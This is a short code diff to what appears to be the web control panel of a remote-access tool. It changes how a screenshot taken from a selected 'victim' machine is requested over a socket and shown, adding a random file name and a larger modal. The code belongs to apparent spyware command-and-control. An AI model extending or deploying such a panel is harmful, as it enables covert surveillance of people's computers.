@@ -60,9 +60,10 @@
       });
 
     $("#screen").on('click', function() { 
+            var random = Math.floor(Math.random() * 1000000) + 1;
            
-           socket.emit('client_screenshot', { toclient: $("#victim").val() }, function (data) {
-                $("#screen-op-body").html("<img src='http://" + ips[$("#victim").val()] + "/s.png'></img>");
+           socket.emit('client_screenshot', { toclient: $("#victim").val(), rand: random }, function (data) {
+                $("#screen-op-body").html("<img style='width:100%' src='http://" + ips[$("#victim").val()] + "/" + random + ".png'></img>");
                 $("#screen-op").modal('show');
             });
 
@@ -223,7 +224,7 @@
   </div>
 
   <div class="modal fade" id="screen-op" role="dialog">
-    <div class="modal-dialog modal-sm">
+    <div class="modal-dialog modal-lg">
       <div class="modal-content">
         <div class="modal-header">
           <button type="button" class="close" data-dismiss="modal">&times;</button>
